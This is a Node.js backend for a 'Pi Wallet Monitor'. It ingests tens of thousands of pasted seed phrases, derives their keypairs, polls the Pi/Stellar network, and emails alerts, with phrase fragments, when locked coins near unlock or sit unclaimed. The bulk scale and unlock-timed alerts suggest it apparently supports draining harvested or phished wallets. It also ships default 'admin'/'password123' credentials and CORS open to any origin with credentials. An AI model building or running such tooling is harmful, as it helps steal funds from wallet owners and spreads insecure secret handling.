/**
 * Pi/Stellar Wallet Monitor — Backend API
 * ---------------------------------------------------------------
 * - Add wallets by pasting phrases (one per line, bulk add supported)
 * - Adaptive scheduler + worker pool with rate-limit-aware backoff
 * - Optional Horizon SSE payment stream for near-real-time alerts
 * - Email alerts via Brevo SMTP on: new claimable balance,
 *   ~24h/~2h before unlock, payment in/out, and unlocked-but-unclaimed
 * - Read-only, never builds or submits transactions
 * ---------------------------------------------------------------
 */

require('dotenv').config();

const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const bip39 = require('bip39');
const hdkey = require('ed25519-hd-key');
const { Keypair, Horizon } = require('stellar-sdk');
const HorizonServer = Horizon.Server;

const app = express();
// Bulk adds can be large (50k phrases ~= tens of MB of body)
app.use(express.json({ limit: '100mb' }));
app.use(cors({
  origin: true,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));

const CONFIG = {
  PORT: parseInt(process.env.PORT) || 3010,
  HORIZON_URL: process.env.HORIZON_URL || 'https://api.mainnet.minepi.com',
  RESERVE_PI: parseInt(process.env.RESERVE_PI) || 1,

  // Adaptive scheduler — per-wallet poll cadence by urgency tier
  POLL_URGENT_MS: parseInt(process.env.POLL_URGENT_MS) || 60000,     // 1 min  — unclaimed / <2h to unlock / first poll
  POLL_SOON_MS:   parseInt(process.env.POLL_SOON_MS)   || 300000,    // 5 min  — <24h to unlock / errored
  POLL_NORMAL_MS: parseInt(process.env.POLL_NORMAL_MS) || 1800000,   // 30 min — funded, no imminent events
  POLL_IDLE_MS:   parseInt(process.env.POLL_IDLE_MS)   || 7200000,   // 2 hr   — empty accounts

  // Worker pool + rate limiter
  MAX_CONCURRENCY: parseInt(process.env.MAX_CONCURRENCY) || 25,
  MAX_RPS: parseInt(process.env.MAX_RPS) || 50,

  // Horizon SSE payment stream (near-real-time payment alerts)
  ENABLE_PAYMENT_STREAM: (process.env.ENABLE_PAYMENT_STREAM || 'true').toLowerCase() !== 'false',

  BREVO_API_KEY: process.env.BREVO_API_KEY || '',
  EMAIL_FROM_NAME: process.env.EMAIL_FROM_NAME || 'Pi Wallet Monitor',
  EMAIL_FROM_ADDRESS: process.env.EMAIL_FROM_ADDRESS || '',
  EMAIL_TO: process.env.EMAIL_TO || '',
  DASH_USER: process.env.DASH_USER || 'admin',
  DASH_PASS: process.env.DASH_PASS || 'password123',
};

const PI_DERIVATION_PATH = "m/44'/314159'/0'";
const REMINDER_24H_MS = 24 * 60 * 60 * 1000;
const REMINDER_2H_MS = 2 * 60 * 60 * 1000;

let mailerReady = !!(CONFIG.BREVO_API_KEY && CONFIG.EMAIL_FROM_ADDRESS && CONFIG.EMAIL_TO);
if (!mailerReady) console.warn('[email] Brevo not configured — alerts disabled');

const wallets = new Map();
const snapshot = {};
const claimableTracked = new Map();
const seenPayments = new Set();
const sessions = new Map();
const unclaimedNotified = new Set();

// ═══════════════════════════ RATE LIMITER ═══════════════════════════
// Token-bucket with 429-triggered adaptive backoff. Every Horizon call
// acquires one token; on throttling we halve rps and back off exponentially,
// then recover slowly on sustained success.

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

const rateState = {
  rps: CONFIG.MAX_RPS,
  targetRps: CONFIG.MAX_RPS,
  tokens: CONFIG.MAX_RPS,
  lastRefill: Date.now(),
  backoffUntil: 0,
  consecutive429s: 0,
  consecutiveOK: 0,
};

function refillTokens() {
  const now = Date.now();
  const dt = (now - rateState.lastRefill) / 1000;
  rateState.tokens = Math.min(rateState.rps, rateState.tokens + dt * rateState.rps);
  rateState.lastRefill = now;
}

async function acquireToken() {
  while (true) {
    const now = Date.now();
    if (now < rateState.backoffUntil) {
      await sleep(Math.min(500, rateState.backoffUntil - now));
      continue;
    }
    refillTokens();
    if (rateState.tokens >= 1) {
      rateState.tokens -= 1;
      return;
    }
    await sleep(20);
  }
}

function onRateLimited() {
  rateState.consecutive429s++;
  rateState.consecutiveOK = 0;
  const backoffMs = Math.min(60000, 500 * Math.pow(2, rateState.consecutive429s));
  rateState.backoffUntil = Date.now() + backoffMs;
  rateState.rps = Math.max(2, rateState.rps * 0.5);
  console.warn(`[ratelimit] throttled: backoff=${backoffMs}ms new_rps=${rateState.rps.toFixed(1)}`);
}

function onCallSuccess() {
  rateState.consecutiveOK++;
  if (rateState.consecutive429s > 0 && rateState.consecutiveOK > 50) rateState.consecutive429s = 0;
  if (rateState.rps < rateState.targetRps && rateState.consecutiveOK % 20 === 0) {
    rateState.rps = Math.min(rateState.targetRps, rateState.rps * 1.1);
  }
}

async function horizonCall(fn) {
  await acquireToken();
  try {
    const r = await fn();
    onCallSuccess();
    return r;
  } catch (e) {
    const status = e?.response?.status || e?.status;
    if (status === 429 || status === 503 || status === 504) onRateLimited();
    throw e;
  }
}

// ═══════════════════════════ STATS ═══════════════════════════

let cachedStats = {
  total_wallets: 0,
  total_available: '0.0000000',
  total_claimable: '0.0000000',
  total_claimable_count: 0,
  total_unlocked_unclaimed: '0.0000000',
  total_unlocked_unclaimed_count: 0,
  polled_wallets: 0,
  last_full_update: null,
  tier_counts: { urgent: 0, soon: 0, normal: 0, idle: 0 },
  poll_lag_avg_ms: 0,
  poll_lag_max_ms: 0,
  rate_limit_rps: CONFIG.MAX_RPS,
  rate_limit_active: false,
  in_flight: 0,
  queue_depth: 0,
  stream_active: false,
  stream_last_event_ago_ms: null,
};

function recomputeStats() {
  let available = 0, claimable = 0, claimableCount = 0;
  let unclaimedCount = 0, unclaimedTotal = 0;
  let polled = 0;
  const tiers = { urgent: 0, soon: 0, normal: 0, idle: 0 };
  let lagSum = 0, lagCount = 0, lagMax = 0;
  const now = Date.now();

  for (const w of wallets.values()) {
    const tier = w.tier || 'urgent';
    tiers[tier] = (tiers[tier] || 0) + 1;
    const snap = snapshot[w.id];
    if (!snap || !snap.updated_at) continue;
    polled++;
    const lag = now - new Date(snap.updated_at).getTime();
    lagSum += lag;
    lagCount++;
    if (lag > lagMax) lagMax = lag;
    available += parseFloat(snap.available_balance || 0);
    claimable += parseFloat(snap.claimable_total || 0);
    const cbs = snap.claimables || [];
    claimableCount += cbs.length;
    for (const cb of cbs) {
      if (cb.is_claimable_now) {
        unclaimedCount++;
        unclaimedTotal += parseFloat(cb.amount);
      }
    }
  }

  cachedStats = {
    total_wallets: wallets.size,
    total_available: available.toFixed(7),
    total_claimable: claimable.toFixed(7),
    total_claimable_count: claimableCount,
    total_unlocked_unclaimed: unclaimedTotal.toFixed(7),
    total_unlocked_unclaimed_count: unclaimedCount,
    polled_wallets: polled,
    last_full_update: new Date().toISOString(),
    tier_counts: tiers,
    poll_lag_avg_ms: lagCount ? Math.round(lagSum / lagCount) : 0,
    poll_lag_max_ms: lagMax,
    rate_limit_rps: parseFloat(rateState.rps.toFixed(1)),
    rate_limit_active: rateState.backoffUntil > now,
    in_flight: inFlight.size,
    queue_depth: workQueue.length,
    stream_active: streamState.active,
    stream_last_event_ago_ms: streamState.lastEventAt ? now - streamState.lastEventAt : null,
  };
  return cachedStats;
}

// ═══════════════════════════ CORE HELPERS ═══════════════════════════

function deriveKeypair(phrase) {
  const seed = bip39.mnemonicToSeedSync(phrase);
  const derived = hdkey.derivePath(PI_DERIVATION_PATH, seed.toString('hex'));
  return Keypair.fromRawEd25519Seed(Buffer.from(derived.key));
}

function getPhrasePreview(phrase) {
  return phrase.trim().split(' ').slice(0, 3).join(' ');
}

async function sendEmail(subject, text, html) {
  if (!mailerReady) return;
  try {
    await axios.post('https://api.brevo.com/v3/smtp/email', {
      sender: { name: CONFIG.EMAIL_FROM_NAME, email: CONFIG.EMAIL_FROM_ADDRESS },
      to: [{ email: CONFIG.EMAIL_TO }],
      subject, textContent: text, htmlContent: html,
    }, {
      headers: {
        'api-key': CONFIG.BREVO_API_KEY,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
    });
  } catch (e) {
    console.error('[email] failed:', e.response?.data?.message || e.message);
  }
}

function emailHtml({ icon, title, accent, rows, footerNote }) {
  const rowsHtml = rows.map(r => `
    <div style="margin-bottom:14px;">
      <div style="color:#00d4ff;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;">${r.label}</div>
      <div style="color:#eef4fa;font-size:${r.mono ? '13px' : '15px'};${r.mono ? "font-family:'Courier New',monospace;word-break:break-all;" : ''}${r.big ? 'font-size:20px;font-weight:800;color:#4caf50;' : ''}">${r.value}</div>
    </div>`).join('');
  return `<!DOCTYPE html><html><body style="margin:0;padding:0;background:#0a1420;">
  <table width="100%" cellpadding="0" cellspacing="0" style="background:#0a1420;padding:28px 12px;">
    <tr><td align="center">
      <table width="480" cellpadding="0" cellspacing="0" style="background:#101f30;border-radius:14px;overflow:hidden;border:1px solid #17324a;font-family:'Segoe UI',Arial,sans-serif;">
        <tr><td style="background:${accent};padding:16px 24px;">
          <span style="color:#04121f;font-size:15px;font-weight:800;letter-spacing:.4px;">${icon} ${title}</span>
        </td></tr>
        <tr><td style="padding:24px 26px;">${rowsHtml}</td></tr>
        <tr><td style="padding:14px 26px;background:#0c1c2c;border-top:1px solid #17324a;">
          <span style="color:#5a7086;font-size:11px;">◎ Pi Wallet Monitor · read-only · ${footerNote || new Date().toUTCString()}</span>
        </td></tr>
      </table>
    </td></tr>
  </table></body></html>`;
}

function evaluatePredicate(predicate) {
  if (!predicate) return { unlock_time: null, is_claimable_now: true };
  let lockUntil = null;

  function walk(pred, negated) {
    if (!pred || pred.unconditional) return;
    if (pred.abs_before) {
      if (negated) {
        const t = new Date(pred.abs_before).getTime();
        if (!lockUntil || t > lockUntil) lockUntil = t;
      }
    }
    if (pred.not) walk(pred.not, !negated);
    if (pred.and) pred.and.forEach(p => walk(p, negated));
    if (pred.or) pred.or.forEach(p => walk(p, negated));
  }

  walk(predicate, false);
  const unlock_time = lockUntil ? new Date(lockUntil).toISOString() : null;
  const is_claimable_now = lockUntil ? Date.now() >= lockUntil : true;
  return { unlock_time, is_claimable_now };
}

// ═══════════════════════════ POLL A SINGLE WALLET ═══════════════════════════

async function pollWallet(w) {
  if (!w) return;
  const h = new HorizonServer(CONFIG.HORIZON_URL);
  const id = w.id;

  try {
    const acc = await horizonCall(() => h.accounts().accountId(w.public_key).call()).catch(() => null);
    if (!acc) {
      snapshot[id] = {
        account_exists: false,
        available_balance: '0.0000000',
        raw_balance: '0.0000000',
        claimable_total: '0.0000000',
        claimables: [],
        lockup_count: 0,
        updated_at: new Date().toISOString(),
        error: null,
      };
      return;
    }

    const rawBal = acc.balances.find(b => b.asset_type === 'native')?.balance || '0';
    const availBal = Math.max(0, parseFloat(rawBal) - CONFIG.RESERVE_PI);
    const cbs = await horizonCall(() => h.claimableBalances().claimant(w.public_key).limit(200).call()).catch(() => ({ records: [] }));
    let claimableTotal = 0;
    const claimables = [];

    for (const cb of cbs.records) {
      claimableTotal += parseFloat(cb.amount);
      const claimant = cb.claimants.find(c => c.destination === w.public_key);
      const pred = claimant ? claimant.predicate : null;
      const { unlock_time, is_claimable_now } = evaluatePredicate(pred);
      claimables.push({ id: cb.id, amount: cb.amount, unlock_time, is_claimable_now });
    }

    snapshot[id] = {
      account_exists: true,
      available_balance: availBal.toFixed(7),
      raw_balance: parseFloat(rawBal).toFixed(7),
      claimable_total: claimableTotal.toFixed(7),
      claimables,
      lockup_count: claimables.length,
      updated_at: new Date().toISOString(),
      error: null,
    };

    // Unlocked-but-unclaimed alerts (fire once per claimable id)
    const phrasePreview = w.phrase_preview || getPhrasePreview(w.phrase);
    const unlockedUnclaimed = claimables.filter(cb => cb.is_claimable_now);
    for (const uc of unlockedUnclaimed) {
      const notifKey = `${w.id}:${uc.id}`;
      if (!unclaimedNotified.has(notifKey)) {
        unclaimedNotified.add(notifKey);
        await sendEmail(
          `🔓 Unlocked but unclaimed — ${phrasePreview}`,
          `Phrase: ${phrasePreview}\nAmount: ${uc.amount} PI\nAddress: ${w.public_key}`,
          emailHtml({
            icon: '🔓', title: 'Unlocked But Unclaimed', accent: '#ff9800',
            rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${uc.amount} PI`, big: true },
              { label: 'Status', value: 'Coins unlocked but NOT moved to available balance' },
              { label: 'Address', value: w.public_key, mono: true },
            ],
          })
        );
      }
    }

    // Payment tracking — skip historical on first observation
    const isFirstPoll = !w.last_payment_cursor;
    const payments = await horizonCall(() => h.payments().forAccount(w.public_key).order('desc').limit(50).call()).catch(() => ({ records: [] }));
    for (const p of payments.records) {
      if (seenPayments.has(p.id)) continue;
      seenPayments.add(p.id);
      if (isFirstPoll) continue;
      const direction = p.to === w.public_key ? 'IN' : (p.from === w.public_key ? 'OUT' : '?');
      const amt = p.amount || p.starting_balance || '?';
      await sendEmail(
        `${direction === 'IN' ? '🟢' : '🔴'} Pi ${direction} — ${phrasePreview}`,
        `Amount: ${amt} PI\nTx: ${p.transaction_hash}`,
        emailHtml({
          icon: direction === 'IN' ? '🟢' : '🔴',
          title: `Payment ${direction === 'IN' ? 'Received' : 'Sent'}`,
          accent: direction === 'IN' ? '#4caf50' : '#f44336',
          rows: [
            { label: 'Phrase', value: phrasePreview, mono: true },
            { label: 'Amount', value: `${amt} PI`, big: true },
            { label: 'Direction', value: direction === 'IN' ? 'Incoming ⬇' : 'Outgoing ⬆' },
            { label: 'Address', value: w.public_key, mono: true },
            { label: 'Tx Hash', value: p.transaction_hash, mono: true },
          ],
        })
      );
    }
    if (payments.records.length) w.last_payment_cursor = payments.records[0].paging_token;
    else if (isFirstPoll) w.last_payment_cursor = 'checked';

    // Unlock reminders — open-ended thresholds (no narrow fire window)
    for (const cb of claimables) {
      if (cb.is_claimable_now) continue;
      let tracked = claimableTracked.get(cb.id);
      if (!tracked) {
        tracked = { wallet_id: w.id, amount: cb.amount, unlock_time: cb.unlock_time, notified_24h: false, notified_2h: false };
        claimableTracked.set(cb.id, tracked);
        await sendEmail(
          `🟢 New claimable balance — ${phrasePreview}`,
          `Amount: ${cb.amount} PI\nUnlock: ${cb.unlock_time || 'Already claimable'}`,
          emailHtml({
            icon: '🟢', title: 'New Claimable Balance', accent: '#4caf50',
            rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${cb.amount} PI`, big: true },
              { label: 'Address', value: w.public_key, mono: true },
              { label: 'Unlock', value: cb.unlock_time ? new Date(cb.unlock_time).toLocaleString() : 'Already claimable' },
            ],
          })
        );
        continue;
      }
      if (cb.unlock_time) {
        const msLeft = new Date(cb.unlock_time).getTime() - Date.now();
        // 24h reminder — fires on any observation inside (2h, 24h]
        if (!tracked.notified_24h && msLeft <= REMINDER_24H_MS && msLeft > REMINDER_2H_MS) {
          tracked.notified_24h = true;
          await sendEmail(`🟡 Unlocks in ~24h — ${phrasePreview}`, `Amount: ${cb.amount} PI`,
            emailHtml({ icon: '🟡', title: 'Unlocks in ~24 Hours', accent: '#ffc107', rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${cb.amount} PI`, big: true },
              { label: 'Unlock', value: new Date(cb.unlock_time).toLocaleString() },
            ]}));
        }
        // 2h reminder — fires on any observation inside (0, 2h]
        if (!tracked.notified_2h && msLeft <= REMINDER_2H_MS && msLeft > 0) {
          tracked.notified_2h = true;
          await sendEmail(`🟠 Unlocks in ~2h — ${phrasePreview}`, `Amount: ${cb.amount} PI`,
            emailHtml({ icon: '🟠', title: 'Unlocks in ~2 Hours', accent: '#ff9800', rows: [
              { label: 'Phrase', value: phrasePreview, mono: true },
              { label: 'Amount', value: `${cb.amount} PI`, big: true },
              { label: 'Unlock', value: new Date(cb.unlock_time).toLocaleString() },
            ]}));
        }
      }
    }
  } catch (e) {
    if (!snapshot[id] || !snapshot[id].account_exists) {
      snapshot[id] = { error: e.message, account_exists: false, updated_at: new Date().toISOString() };
    } else {
      snapshot[id].error = e.message;
      snapshot[id].updated_at = new Date().toISOString();
    }
  }
}

// ═══════════════════════════ ADAPTIVE SCHEDULER + WORKER POOL ═══════════════════════════
// A tick loop scans wallets every 250ms and enqueues those whose `next_poll_at` has passed.
// A pool of N workers drains the queue concurrently. Global throttling lives in the rate
// limiter, so worker count is just the concurrency ceiling.

const workQueue = [];
const scheduledSet = new Set(); // dedup — id present iff in workQueue
const inFlight = new Set();
let schedulerRunning = false;

function cadenceFor(tier) {
  switch (tier) {
    case 'urgent': return CONFIG.POLL_URGENT_MS;
    case 'soon':   return CONFIG.POLL_SOON_MS;
    case 'normal': return CONFIG.POLL_NORMAL_MS;
    case 'idle':   return CONFIG.POLL_IDLE_MS;
    default:       return CONFIG.POLL_NORMAL_MS;
  }
}

function classifyWallet(w) {
  const snap = snapshot[w.id];
  if (!snap || !snap.updated_at) return 'urgent';       // never polled → ASAP
  if (snap.error) return 'soon';                        // errored → retry ~5min
  const claimables = snap.claimables || [];
  if (claimables.some(cb => cb.is_claimable_now)) return 'urgent'; // unclaimed sitting
  let minMsLeft = Infinity;
  for (const cb of claimables) {
    if (cb.unlock_time) {
      const ms = new Date(cb.unlock_time).getTime() - Date.now();
      if (ms > 0 && ms < minMsLeft) minMsLeft = ms;
    }
  }
  if (minMsLeft <= REMINDER_2H_MS) return 'urgent';
  if (minMsLeft <= REMINDER_24H_MS) return 'soon';
  if (snap.account_exists || claimables.length > 0) return 'normal';
  return 'idle';
}

function scheduleNext(w) {
  const tier = classifyWallet(w);
  w.tier = tier;
  const base = cadenceFor(tier);
  const jitter = Math.random() * base * 0.1; // 10% jitter to avoid stampedes
  w.next_poll_at = Date.now() + base + jitter;
}

function scheduleImmediate(walletId) {
  const w = wallets.get(walletId);
  if (!w) return;
  w.next_poll_at = 0; // pick up on next tick
}

function tickScheduler() {
  const now = Date.now();
  for (const w of wallets.values()) {
    if (scheduledSet.has(w.id) || inFlight.has(w.id)) continue;
    if (!w.next_poll_at || w.next_poll_at <= now) {
      workQueue.push(w.id);
      scheduledSet.add(w.id);
    }
  }
}

async function worker(idx) {
  while (schedulerRunning) {
    const walletId = workQueue.shift();
    if (!walletId) { await sleep(50); continue; }
    scheduledSet.delete(walletId);
    const w = wallets.get(walletId);
    if (!w) continue; // deleted between queue and drain
    inFlight.add(walletId);
    try {
      await pollWallet(w);
    } catch (e) {
      console.error(`[worker ${idx}] pollWallet crashed:`, e.message);
    } finally {
      inFlight.delete(walletId);
      if (wallets.has(walletId)) scheduleNext(w);
    }
  }
}

function startScheduler() {
  schedulerRunning = true;
  setInterval(tickScheduler, 250);
  for (let i = 0; i < CONFIG.MAX_CONCURRENCY; i++) worker(i);
  setInterval(recomputeStats, 3000);
  console.log(`[scheduler] ${CONFIG.MAX_CONCURRENCY} workers, target rps=${CONFIG.MAX_RPS}`);
  console.log(`[scheduler] cadence — urgent:${CONFIG.POLL_URGENT_MS}ms soon:${CONFIG.POLL_SOON_MS}ms normal:${CONFIG.POLL_NORMAL_MS}ms idle:${CONFIG.POLL_IDLE_MS}ms`);
}

// ═══════════════════════════ HORIZON PAYMENT STREAM (SSE) ═══════════════════════════
// Single global stream of all payments on the network. We filter locally against
// a public-key index. On a hit, we schedule the affected wallet for an immediate
// re-poll so the existing email logic handles alerting (no duplication).

const streamState = {
  active: false,
  cursor: 'now',
  lastEventAt: null,
  publicKeyIndex: new Map(),
  reconnectAttempts: 0,
};

function refreshStreamIndex() {
  streamState.publicKeyIndex.clear();
  for (const w of wallets.values()) streamState.publicKeyIndex.set(w.public_key, w.id);
}

function startPaymentStream() {
  if (!CONFIG.ENABLE_PAYMENT_STREAM) {
    console.log('[stream] disabled via ENABLE_PAYMENT_STREAM=false');
    return;
  }
  refreshStreamIndex();
  setInterval(refreshStreamIndex, 30000);

  let closeFn = null;
  function connect() {
    try {
      const h = new HorizonServer(CONFIG.HORIZON_URL);
      console.log(`[stream] connecting cursor=${streamState.cursor}`);
      closeFn = h.payments().cursor(streamState.cursor).stream({
        onmessage: (p) => {
          streamState.active = true;
          streamState.lastEventAt = Date.now();
          streamState.cursor = p.paging_token || streamState.cursor;
          streamState.reconnectAttempts = 0;
          const walletId = streamState.publicKeyIndex.get(p.to) || streamState.publicKeyIndex.get(p.from);
          if (walletId) scheduleImmediate(walletId);
        },
        onerror: (e) => {
          streamState.active = false;
          console.error('[stream] error:', e?.message || 'connection error');
          try { closeFn && closeFn(); } catch (_) {}
          streamState.reconnectAttempts++;
          const backoff = Math.min(60000, 2000 * Math.pow(2, Math.min(streamState.reconnectAttempts, 5)));
          setTimeout(connect, backoff);
        },
      });
    } catch (e) {
      streamState.active = false;
      console.error('[stream] failed to start:', e.message);
      setTimeout(connect, 10000);
    }
  }
  connect();
}

// ═══════════════════════════ AUTH ═══════════════════════════

const authRequired = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token || !sessions.has(token)) return res.status(401).json({ success: false, error: 'unauthorized' });
  req.authToken = token;
  next();
};

// ═══════════════════════════ ROUTES ═══════════════════════════

app.post('/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user !== CONFIG.DASH_USER || pass !== CONFIG.DASH_PASS)
    return res.status(401).json({ success: false, error: 'invalid credentials' });
  const token = crypto.randomUUID();
  sessions.set(token, { user, created: Date.now() });
  res.json({ success: true, token });
});

app.get('/api/verify-token', authRequired, (_req, res) => {
  res.json({ success: true });
});

app.post('/api/wallets', authRequired, (req, res) => {
  try {
    const { phrases } = req.body || {};
    if (!phrases || !phrases.trim()) return res.status(400).json({ success: false, error: 'phrases required' });

    let rawLines = phrases.split(/[\r\n;,]+/).map(p => p.trim()).filter(p => p.length > 0);
    const phraseList = [];
    for (const line of rawLines) {
      const words = line.split(/\s+/).filter(w => w.length > 0);
      if (words.length <= 24) {
        phraseList.push(line);
      } else {
        for (let i = 0; i < words.length; i += 24) {
          const chunk = words.slice(i, i + 24).join(' ');
          if (chunk.split(/\s+/).length >= 12) phraseList.push(chunk);
        }
      }
    }
    if (phraseList.length === 0) return res.status(400).json({ success: false, error: 'no valid phrases' });

    const totalPhrases = phraseList.length;
    console.log(`[wallets] Queued ${totalPhrases} phrases for background derivation...`);
    res.json({ success: true, added: 0, queued: totalPhrases, total: wallets.size + totalPhrases, processing: true });

    let idx = 0;
    const CHUNK_SIZE = 50;
    function processChunk() {
      const end = Math.min(idx + CHUNK_SIZE, phraseList.length);
      for (let i = idx; i < end; i++) {
        try {
          const phrase = phraseList[i];
          const kp = deriveKeypair(phrase);
          const id = crypto.randomUUID();
          wallets.set(id, {
            id,
            label: kp.publicKey().slice(0, 8),
            phrase: phrase.trim(),
            phrase_preview: getPhrasePreview(phrase),
            public_key: kp.publicKey(),
            created_at: new Date().toISOString(),
            last_payment_cursor: null,
            next_poll_at: 0,    // fire ASAP
            tier: 'urgent',
          });
        } catch (_) { /* skip invalid phrases silently */ }
      }
      idx = end;
      cachedStats.total_wallets = wallets.size;
      if (idx < phraseList.length) setImmediate(processChunk);
      else console.log(`[wallets] Background derivation done. Total: ${wallets.size}`);
    }
    setImmediate(processChunk);
  } catch (e) {
    res.status(400).json({ success: false, error: e.message });
  }
});

app.get('/api/wallets', authRequired, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = Math.min(parseInt(req.query.limit) || 50, 200);
  const offset = (page - 1) * limit;

  const allWallets = Array.from(wallets.values());
  const enriched = allWallets.map(w => {
    const snap = snapshot[w.id] || {};
    const claimables = snap.claimables || [];

    let earliest_unlock = null;
    const lockedItems = claimables.filter(cb => !cb.is_claimable_now && cb.unlock_time);
    if (lockedItems.length > 0) {
      lockedItems.sort((a, b) => new Date(a.unlock_time) - new Date(b.unlock_time));
      earliest_unlock = lockedItems[0].unlock_time;
    }

    const unlockedUnclaimed = claimables.filter(cb => cb.is_claimable_now);
    const unlocked_unclaimed_count = unlockedUnclaimed.length;
    const unlocked_unclaimed_total = unlockedUnclaimed.reduce((s, cb) => s + parseFloat(cb.amount), 0).toFixed(7);

    return {
      id: w.id,
      label: w.label,
      public_key: w.public_key,
      phrase_preview: w.phrase_preview || getPhrasePreview(w.phrase),
      created_at: w.created_at,
      account_exists: snap.account_exists || false,
      available_balance: snap.available_balance || '0.0000000',
      raw_balance: snap.raw_balance || '0.0000000',
      claimable_total: snap.claimable_total || '0.0000000',
      claimables,
      lockup_count: snap.lockup_count || 0,
      error: snap.error || null,
      updated_at: snap.updated_at || null,
      earliest_unlock,
      unlocked_unclaimed_count,
      unlocked_unclaimed_total,
      polled: !!snap.updated_at,
      tier: w.tier || 'urgent',
    };
  });

  enriched.sort((a, b) => {
    const aUnclaimed = a.unlocked_unclaimed_count > 0;
    const bUnclaimed = b.unlocked_unclaimed_count > 0;
    if (aUnclaimed && !bUnclaimed) return -1;
    if (!aUnclaimed && bUnclaimed) return 1;
    if (aUnclaimed && bUnclaimed) return parseFloat(b.unlocked_unclaimed_total) - parseFloat(a.unlocked_unclaimed_total);

    const aUpcoming = !!a.earliest_unlock;
    const bUpcoming = !!b.earliest_unlock;
    if (aUpcoming && !bUpcoming) return -1;
    if (!aUpcoming && bUpcoming) return 1;
    if (aUpcoming && bUpcoming) return new Date(a.earliest_unlock) - new Date(b.earliest_unlock);

    return new Date(b.created_at) - new Date(a.created_at);
  });

  const paginated = enriched.slice(offset, offset + limit);
  res.json({
    success: true,
    wallets: paginated,
    stats: cachedStats,
    pagination: {
      page,
      limit,
      total: enriched.length,
      pages: Math.ceil(enriched.length / limit),
    },
  });
});

app.delete('/api/wallets/:id', authRequired, (req, res) => {
  const { id } = req.params;
  if (!wallets.has(id)) return res.status(404).json({ success: false, error: 'not found' });
  wallets.delete(id);
  delete snapshot[id];
  scheduledSet.delete(id);
  Array.from(claimableTracked.entries()).forEach(([cbId, t]) => {
    if (t.wallet_id === id) claimableTracked.delete(cbId);
  });
  Array.from(unclaimedNotified).forEach(k => {
    if (k.startsWith(id + ':')) unclaimedNotified.delete(k);
  });
  res.json({ success: true });
});

app.get('/api/health', (_req, res) => {
  res.json({
    ok: true,
    wallets: wallets.size,
    inflight: inFlight.size,
    queue: workQueue.length,
    rps: parseFloat(rateState.rps.toFixed(1)),
    throttled: rateState.backoffUntil > Date.now(),
    stream: streamState.active,
  });
});

// ═══════════════════════════ BOOT ═══════════════════════════

app.listen(CONFIG.PORT, () => {
  console.log(`✓ Pi Wallet Monitor API listening on :${CONFIG.PORT}`);
  startScheduler();
  startPaymentStream();
});
